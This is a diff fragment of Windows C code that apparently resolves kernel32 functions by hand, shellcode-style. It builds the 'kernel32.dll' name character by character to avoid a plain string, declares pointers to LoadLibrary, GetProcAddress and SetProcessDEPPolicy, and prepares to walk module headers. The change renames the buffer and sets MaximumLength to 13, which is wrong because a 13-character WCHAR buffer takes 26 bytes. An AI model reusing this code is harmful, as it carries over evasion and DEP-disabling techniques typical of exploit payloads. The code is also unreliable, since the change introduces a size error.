@@ -68,20 +68,20 @@ typedef HMODULE ( WINAPI * LoadLibrar)(IN LPCTSTR lpFileName) ;
 typedef int (WINAPI * SetProcessDEPPolicyy)( IN int flag) ;
 
 UNICODE_STRING  sh ;
-    WCHAR k[13] ;
-    k[0] ='k' ;
-    k[1] ='e' ;
-    k[2] ='r' ;
-    k[3] ='n';
-    k[4] ='e';
-    k[5] ='l';
-    k[6] ='3';
-    k[7] ='2';
-    k[8] ='.';
-    k[9] ='d';
-    k[10]='l';
-    k[11]='l';
-    k[12]=0x0;
+    WCHAR kernel_32dll[13] ;
+    kernel_32dll[0] ='k' ;
+    kernel_32dll[1] ='e' ;
+    kernel_32dll[2] ='r' ;
+    kernel_32dll[3] ='n';
+    kernel_32dll[4] ='e';
+    kernel_32dll[5] ='l';
+    kernel_32dll[6] ='3';
+    kernel_32dll[7] ='2';
+    kernel_32dll[8] ='.';
+    kernel_32dll[9] ='d';
+    kernel_32dll[10]='l';
+    kernel_32dll[11]='l';
+    kernel_32dll[12]= 0x0;
 
     /*well , this is the weirdest thing I have ever seen in programming .
       Using Gcc Compiler , It does work if and only if the function pointer(myGetProcAdd) is declared as static variable,
@@ -93,9 +93,9 @@ UNICODE_STRING  sh ;
 /*static*/ ProcAddress myGetProcAdd ;
 LoadLibrar  myLoadLibrary ;
 SetProcessDEPPolicyy mySetProcessDEPPolicy ;
-sh.Buffer = k;
+sh.Buffer = kernel_32dll;
 sh.Length = 0x0 ;
-sh.MaximumLength = sizeof(k) ;
+sh.MaximumLength = 13 ;
 int i = 0 ;
 PVOID Kernel32_DllBase = 0 ;
 IMAGE_DOS_HEADER * idh = 0 ;
